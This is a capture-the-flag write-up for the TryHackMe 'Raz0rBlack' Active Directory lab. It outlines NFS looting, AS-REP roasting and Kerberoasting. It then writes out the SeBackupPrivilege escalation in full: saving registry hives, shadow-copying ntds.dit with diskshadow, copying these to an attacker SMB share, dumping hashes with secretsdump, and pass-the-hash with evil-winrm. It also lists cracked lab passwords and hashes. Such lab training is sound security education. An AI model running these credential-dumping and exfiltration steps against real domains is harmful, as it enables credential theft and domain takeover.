# THM Raz0rBlack

> **Platform:** TryHackMe — https://tryhackme.com/room/raz0rblack
> **OS:** Windows (Active Directory)
> **Domain:** `raz0rblack.thm` — DC `HAVEN-DC` (`HAVEN-DC.raz0rblack.thm`)
> **Theme:** NFS loot → AS-REP roast → Kerberoast → **SeBackupPrivilege** → NTDS → Domain Admin.

> **Note on the target IP:** TryHackMe VPN — the address rotated (`10.49.131.83`, `10.48.163.68`, `10.48.186.163`, `10.49.141.164`). Substitute your own.

## Attack Path Overview

1. **Recon** – DC also exposes **NFS** (111/2049).
2. **NFS loot** – the `/users` export holds `employee_status.xlsx` → employee names → usernames.
3. **AS-REP Roasting** – `twilliams` has pre-auth disabled; crack → `roastpotatoes`.
4. **Kerberoasting** – as `twilliams`, the SPN account `xyan1d3` (Remote Management Users) cracks → `cyanide9amine5628`.
5. **Foothold** – WinRM as `xyan1d3`, who holds **SeBackupPrivilege / SeRestorePrivilege**.
6. **DA via SeBackup** – read the registry hives / shadow-copy `ntds.dit`, dump offline → Domain Admin.

## 9. SeBackupPrivilege → Domain Admin

`SeBackupPrivilege` reads any file regardless of ACLs.

### 9a. Registry hives (local SAM only — the DSRM admin, not the domain)

```cmd
reg save hklm\sam sam
reg save hklm\system system
```
```bash
impacket-smbserver share . -smb2support
```
```cmd
copy sam \\<KALI IP>\share\sam
copy system \\<KALI IP>\share\system
```
```bash
impacket-secretsdump -sam sam -system system LOCAL
```

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

> ⚠️ On a **Domain Controller** the SAM hive holds the **DSRM** Administrator, not the domain Administrator. That `9689931...` hash won't log you in as the domain admin over WinRM unless DSRM network logon is enabled. The real domain hashes live in `ntds.dit` — continue below.

### 9b. Shadow-copy `ntds.dit` (domain hashes)

`ntds.dit` is locked, so snapshot the volume with **diskshadow** and read it via `robocopy /b`:

```bash
# on Kali — build a diskshadow script (DOS line endings)
cat > viper.dsh <<'EOF'
set context persistent nowriters
add volume c: alias viper
create
expose %viper% x:
EOF
unix2dos viper.dsh
```

```cmd
:: on target
cd c:\windows\tasks
upload viper.dsh
diskshadow /s viper.dsh
robocopy /b x:\windows\ntds . ntds.dit
reg save hklm\system c:\windows\tasks\system
```

Exfil and dump offline:

```bash
impacket-smbserver share ./ -smb2support -user test -pass ''
# copy ntds.dit + system to the share from Windows, then:
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

This yields the **domain** `Administrator` NT hash (and `krbtgt`). Pass-the-Hash to finish:

```bash
evil-winrm -i 10.49.141.164 -u 'Administrator' -H '<domain admin NT hash>'
# or impacket-psexec / wmiexec with -hashes
```

> Grab the per-user flags along the way (e.g. `twilliams`, `xyan1d3` desktops) and the final flag as Administrator.

## Lessons Learned

- **Don't ignore NFS on Windows DCs** — exported shares (`/users`) can hand you a username list with no credentials.
- **AS-REP `GetNPUsers` may return case-variant principals** (`twilliams`/`Twilliams`) — crack whichever one hashes.
- **Kerberoast the account that's in `Remote Management Users`** — it gives you a WinRM foothold, not just a password.
- **SeBackupPrivilege on a DC**: the SAM hive only yields the DSRM admin; the domain hashes require reading `ntds.dit`, which must be shadow-copied (diskshadow) because it's locked.
